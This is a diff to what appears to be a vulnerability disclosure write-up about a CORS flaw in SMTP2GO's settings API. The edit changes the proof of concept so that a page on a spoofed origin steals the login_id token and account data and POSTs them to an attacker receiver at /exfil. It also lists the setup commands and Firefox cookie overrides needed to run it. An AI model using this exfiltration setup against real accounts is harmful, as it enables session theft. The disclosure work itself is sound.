@@ -97,10 +97,45 @@ curl -si 'https://app-us.smtp2go.com/api/settings/webhooks/' \
 `poc/wcp-006-cors.html` — served from `http://insights.hotjar.com` via `/etc/hosts`.
 
 Runs automatically on page load from the attacker's origin. Makes two credentialed cross-origin requests:
-1. `GET /api/settings/webhooks/` — extracts and displays `login_id` token
-2. `GET /api/settings/subaccounts/` — reads account/plan data
+1. `GET /api/settings/webhooks/` — extracts and exfiltrates `login_id` token + full webhook response
+2. `GET /api/settings/subaccounts/` — exfiltrates account/plan data
 
-Tested in: Firefox 149 with `network.cookie.sameSite.laxByDefault = false` and `network.cookie.cookieBehavior = 0`.
+Stolen data is POSTed as JSON to the attacker's server (`POST /exfil`) on each step.
+
+### Confirmed Setup
+
+```
+Terminal 1 (attacker HTML server):
+  sudo python3 -m http.server 80
+  → serves wcp-006-cors.html at http://insights.hotjar.com/wcp-006-cors.html
+
+Terminal 2 (exfil receiver):
+  python3 exfil-server.py   # listens on port 8080
+  → receives stolen session data at POST http://localhost:8080/exfil
+
+/etc/hosts:
+  127.0.0.1  insights.hotjar.com
+```
+
+### Firefox Configuration
+
+Tested and confirmed in Firefox with the following `about:config` overrides:
+
+| Setting | Value |
+|---|---|
+| `network.cookie.sameSite.laxByDefault` | `false` |
+| `network.cookie.cookieBehavior` | `0` |
+
+These settings instruct Firefox to send cross-site cookies without SameSite enforcement,
+matching the behaviour of browsers that predate SameSite-by-default — or any browser
+where the victim has non-default cookie settings.
+
+Chrome 80+ enforces SameSite=Lax by default and blocks this attack without the
+`--disable-features=SameSiteByDefaultCookies` launch flag.
+
+**Affected population**: Firefox users (default config allows this if the cookie has no
+SameSite attribute), older browsers, embedded webviews, and managed Chromium deployments
+with SameSite enforcement disabled.
 
 ---
 
